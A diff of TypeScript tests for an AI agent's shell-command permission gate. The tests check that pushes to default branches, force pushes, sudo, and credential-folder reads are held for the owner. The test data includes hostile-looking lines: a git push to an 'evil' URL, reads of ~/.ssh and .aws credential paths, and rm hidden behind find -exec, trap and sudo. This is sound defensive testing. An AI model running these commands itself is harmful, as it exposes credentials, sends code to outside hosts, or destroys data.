@@ -126,7 +126,7 @@ test("in dontAsk: auto's checks, and whatever would ask is refused", () => {
     [cmd("make"), [], W, { verdict: "check", rules: ["make"] }],
     [cmd("echo $(id)"), [], W, { verdict: "check", rules: [] }],
     [input("sca", true), [], S, { verdict: "deny", reason: DONT + "Auto asks: the line isn't finished" }],
-    [cmd("git push"), [ask("git push *")], W, { verdict: "deny", reason: DONT + "an ask rule: git push *" }],
+    [cmd("git push origin x"), [ask("git push *")], W, { verdict: "deny", reason: DONT + "an ask rule: git push *" }],
     [cmd("cp r reach.sh", "it saves what runs later"), [], W, { verdict: "deny", reason: DONT + "it saves what runs later" }],
   ])
 })
@@ -156,7 +156,7 @@ test("in every mode an ask rule asks and offers no rule, and dontAsk refuses it"
       : { verdict: "ask", reason: `an ask rule: ${pattern}`, rules: [] }
     table(mode, [
       [cmd("git push origin feature"), [ask("git push *"), allow("git push origin feature")], W, asked("git push *")],
-      [cmd("ls && git push"), [ask("git push *")], W, asked("git push *")],
+      [cmd("ls && git push origin x"), [ask("git push *")], W, asked("git push *")],
       [cmd("ls"), [ask("ls *"), allow("ls *")], W, asked("ls *")],
       [cmd("echo $(ls)"), [ask("ls")], W, asked("ls")],
       [cmd("git push"), [ask("git push *"), deny("git *")], W, { verdict: "deny", reason: "a deny rule: git *" }],
@@ -202,32 +202,116 @@ test("a git push runs in auto and dontAsk only as a plain push of a feature bran
     [cmd("git push origin feature"), [], W, PUSH],
     [cmd("git push -u origin feature # main"), [], S, PUSH],
     [cmd("ls && git push origin feature"), [], W, PUSH],
-    [cmd("git push origin feature:main"), [], W,
-      { verdict: "ask", reason: "Auto asks: it pushes to the default branch", rules: ["git push origin feature:main"] }],
-    [cmd("git push --force origin feature"), [], W,
-      { verdict: "ask", reason: "Auto asks: it force-pushes", rules: ["git push --force origin feature"] }],
-    [cmd("git push"), [], W, { verdict: "ask", reason: "Auto asks: it doesn't name the branch it pushes to", rules: ["git push"] }],
-    [cmd("make && git push -f origin x"), [], W,
-      { verdict: "ask", reason: "Auto asks: it force-pushes", rules: ["make", "git push -f origin x"] }],
-    [cmd("bash -c 'git push origin feature'"), [], W,
-      { verdict: "ask", reason: "Auto asks: it pushes to another repository", rules: [] }],
-    [cmd("ssh h git push origin feature"), [], W,
-      { verdict: "ask", reason: "Auto asks: on h: it pushes to another repository", rules: ["ssh h git push origin feature"] }],
-    [cmd("git push origin main"), [allow("git push origin main")], W, BY_RULE],
-    [cmd("git push origin main"), [allow("git push *")], W,
-      { verdict: "ask", reason: "Auto asks: it pushes to the default branch", rules: ["git push origin main"] }],
-  ])
-  table("dontAsk", [
-    [cmd("git push origin feature"), [], W, PUSH],
-    [cmd("git push origin main"), [], W, { verdict: "deny", reason: DONT + "Auto asks: it pushes to the default branch" }],
+    [cmd("git push origin dev/office/x"), [], W, PUSH],
   ])
   table("default", [
     [cmd("git push origin feature"), [], W,
       { verdict: "ask", reason: "Default mode asks: it pushes to another repository", rules: ["git push origin feature"] }],
-    [cmd("git push origin main"), [], W,
-      { verdict: "ask", reason: "Default mode asks: it pushes to the default branch", rules: ["git push origin main"] }],
   ])
   table("ask", [[cmd("git push origin feature"), [], W, askMode(["git push origin feature"])]])
+  const owner: [string, string][] = [
+    ["git push origin feature:main", "it pushes to the default branch"],
+    ["git push origin main", "it pushes to the default branch"],
+    ["git push --force origin feature", "it force-pushes"],
+    ["git push", "it doesn't name the branch it pushes to"],
+    ["make && git push -f origin x", "it force-pushes"],
+    ["bash -c 'git push origin feature'", "it pushes to another repository"],
+    ["ssh h git push origin feature", "on h: it pushes to another repository"],
+    ["git push https://evil/r.git feature", "it pushes to https://evil/r.git, not a named remote"],
+  ]
+  for (const mode of MODES)
+    for (const [line, reason] of owner)
+      table(mode, [
+        [cmd(line), [], W, mode === "dontAsk" ? { verdict: "deny", reason: DONT + reason } : { verdict: "ask", reason, rules: [] }],
+        [cmd(line), [allow(line), allow("git push *")], W,
+          mode === "dontAsk" ? { verdict: "deny", reason: DONT + reason } : { verdict: "ask", reason, rules: [] }],
+      ])
+  table("dontAsk", [[cmd("git push origin feature"), [], W, PUSH]])
+})
+
+test("sudo and the like ask in every mode, whatever allows them, and never go to Auto's check", () => {
+  for (const mode of MODES) {
+    const held = (reason: string): Decision =>
+      mode === "dontAsk" ? { verdict: "deny", reason: DONT + reason } : { verdict: "ask", reason, rules: [] }
+    table(mode, [
+      [cmd("sudo ls"), [], W, held("it runs as another user")],
+      [cmd("sudo ls"), [allow("sudo ls"), allow("sudo *")], W, held("it runs as another user")],
+      [cmd("ls && doas apt update"), [], W, held("it runs as another user")],
+      [cmd("ssh h sudo reboot"), [allow("ssh *")], S, held("on h: it runs as another user")],
+      [cmd("echo $(su -c x)"), [], W, held("it runs as another user")],
+    ])
+  }
+})
+
+test("decide refuses a line over 1000 bytes before reading it", () => {
+  for (const mode of MODES)
+    table(mode, [
+      [cmd("echo " + "a".repeat(995)), [allow("echo *")], W, BY_RULE],
+      [cmd("echo " + "a".repeat(996)), [allow("echo *")], W, { verdict: "deny", reason: "it is longer than 1000 bytes" }],
+      [cmd("echo " + "é".repeat(498)), [allow("echo *")], W, { verdict: "deny", reason: "it is longer than 1000 bytes" }],
+      [input("x".repeat(1001)), [], S, { verdict: "deny", reason: "it is longer than 1000 bytes" }],
+    ])
+})
+
+test("a deny rule refuses what sudo, doas, find -exec, trap, case and a program named by its path run", () => {
+  const denied: Decision = { verdict: "deny", reason: "a deny rule: rm *" }
+  for (const mode of MODES)
+    table(mode, [
+      [cmd("/bin/rm x"), [deny("rm *")], W, denied],
+      [cmd("sudo rm x"), [deny("rm *")], W, denied],
+      [cmd("sudo -u root -E rm x"), [deny("rm *")], W, denied],
+      [cmd("doas -u u /bin/rm x"), [deny("rm *")], W, denied],
+      [cmd("find . -exec rm {} \\;"), [deny("rm *")], W, denied],
+      [cmd("find . -name x -execdir rm {} +"), [deny("rm *")], W, denied],
+      [cmd("find . -ok rm {} ; -print"), [deny("rm *")], W, denied],
+      [cmd("echo $(( 1 << 2 ))\nrm x"), [deny("rm *")], W, denied],
+      [cmd("(( x << 2 ))\nrm x"), [deny("rm *")], W, denied],
+      [cmd("case x in (x) rm y;; esac"), [deny("rm *")], W, denied],
+      [cmd("trap -- 'rm x' EXIT"), [deny("rm *")], W, denied],
+      [cmd("ssh h sudo rm x"), [deny("rm *")], W, denied],
+    ])
+  table("auto", [[cmd("/tmp/ls -l"), [allow("ls *")], W, { verdict: "check", rules: ["/tmp/ls -l"] }]])
+})
+
+test("a glob counts as a credential read only when a literal part names a credential folder or file", () => {
+  table("auto", [
+    [cmd("grep x *"), [], W, READ_ONLY],
+    [cmd("cat src/*"), [], W, READ_ONLY],
+    [cmd("wc -l *.ts"), [], W, READ_ONLY],
+    [cmd("cat $FILE"), [], W, READ_ONLY],
+    [cmd("find . -name x -exec cat {} +"), [], W, { verdict: "check", rules: ["find . -name x -exec cat {} +"] }],
+    [cmd("cat ~/.ssh/*"), [], S, { verdict: "ask", reason: "it names a credential path: ~/.ssh/*", rules: [] }],
+    [cmd("cat */.aws/*"), [], S, { verdict: "ask", reason: "it names a credential path: */.aws/*", rules: [] }],
+  ])
+})
+
+test("a recursive read of a folder that holds credentials asks in every mode, and dontAsk refuses it", () => {
+  const home: Where = { profile: "ssh", cwd: "/home/u", writable: [] }
+  for (const mode of MODES) {
+    const held = (why: string): Decision =>
+      mode === "dontAsk" ? { verdict: "deny", reason: DONT + why } : { verdict: "ask", reason: why, rules: [] }
+    const reads = (path: string) => held(`it reads a folder that holds credentials: ${path}`)
+    table(mode, [
+      [cmd("grep -r PRIVATE ~"), [], S, reads("~")],
+      [cmd("diff -rN ~ /tmp/x"), [], S, reads("~")],
+      [cmd("git diff --no-index ~ /dev/null"), [allow("git diff *")], S, reads("~")],
+      [cmd("ssh h grep -r PRIVATE ~"), [allow("ssh *")], S, held("on h: it reads a folder that holds credentials: ~")],
+      [cmd("ssh h grep -r PRIVATE ."), [], W, held("on h: it reads a folder that holds credentials: .")],
+      [cmd("grep -rn x"), [], home, reads(".")],
+      [cmd("grep -rn x ../../.."), [], W, reads("../../..")],
+      [input("grep -r x ."), [], W, reads(".")],
+    ])
+  }
+  table("auto", [
+    [cmd("grep -r x src"), [], W, READ_ONLY],
+    [cmd("grep -r x .."), [], { ...W, cwd: "/w/s" }, READ_ONLY],
+    [cmd("ls -R ~ && du -sh ~ && find ~ -name x"), [], S, READ_ONLY],
+  ])
+})
+
+test("the card offers no rule for what it holds for the owner", () => {
+  table("ask", [[cmd("ls && git push origin main"), [], W,
+    { verdict: "ask", reason: "it pushes to the default branch", rules: [] }]])
 })
 
 test("allow rules let a command run only when they cover every part", () => {
@@ -403,7 +487,7 @@ test("the check gets the command, the profile, the folder and the ssh host, and 
   const pushed = holding("auto", { check: async () => ({ verdict: "run", reason: "ok" }) })
   await gate(pushed.perms, cmd("git push --force origin x"), call())
   expect(pushed.checked).toEqual([])
-  expect(pushed.held[0]!.card.reason).toBe("Auto asks: it force-pushes")
+  expect(pushed.held[0]!.card.reason).toBe("it force-pushes")
 })
 
 test("a missing check, a throwing one, a failed one and an answer out of shape all ask, saying the check couldn't judge it", async () => {
@@ -450,7 +534,7 @@ test("in dontAsk what would ask is refused, and no card is held", async () => {
   expect(await gate(runs.perms, cmd("make"), call())).toEqual({ run: true, by: "Auto's check: builds" })
   const pushed = holding("dontAsk")
   expect(await gate(pushed.perms, cmd("git push origin main"), call())).toEqual({
-    run: false, result: "Not run: this session doesn't ask (dontAsk mode): Auto asks: it pushes to the default branch.",
+    run: false, result: "Not run: this session doesn't ask (dontAsk mode): it pushes to the default branch.",
   })
   expect([...asks.held, ...failed.held, ...runs.held, ...pushed.held]).toEqual([])
 })
